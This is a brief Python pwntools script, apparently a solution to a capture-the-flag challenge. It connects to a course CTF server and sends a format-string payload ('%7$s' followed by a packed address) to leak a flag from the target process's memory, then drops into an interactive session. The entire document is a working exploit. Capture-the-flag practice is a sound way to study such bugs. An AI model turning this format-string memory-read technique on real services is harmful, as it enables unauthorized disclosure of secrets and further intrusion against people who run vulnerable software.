from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10133

r = remote(host, port)

# input('Press enter to continue.')

flag = 0x600ba0
payload = b'%7$saaaa' + p64(flag)
r.sendline(payload)

r.interactive()
